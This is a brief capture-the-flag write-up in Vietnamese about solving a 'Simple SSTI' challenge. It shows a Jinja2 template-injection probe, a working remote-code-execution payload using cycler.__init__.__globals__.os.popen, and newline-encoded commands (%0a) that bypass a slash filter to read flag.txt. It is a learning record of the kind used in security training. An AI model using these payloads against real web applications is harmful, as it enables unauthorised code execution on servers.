- tiêu đề : Simple SSTI 
- nội dung : RCE 

- uhm bài này thì mình view xíu cũng ít chỗ attack nên thử xíu tìm cái SSTI như đề :> 
{{6*8}}

![Alt text](<../image/39.1.png>) 

- rồi tra thôi này là jinja2 python ( tự xây payload cũng căng đét ậy :v mình chưa hiểu sâu nên vẫn tìm chít sít ) 
{{ cycler.__init__.__globals__.os.popen('payload').read() }}

![Alt text](<../image/39.2.png>)  

- uhm thử lúc thì mình tưởng payload sai hóa ra là nó cấm dấu / 
- nên mình dùng payload là cd .. %0a cd .. %0a cd .. %0a cat flag.txt 

![Alt text](<../image/39.3.png>) 

- pem và lụm cờ th 

#hackerga2101: 
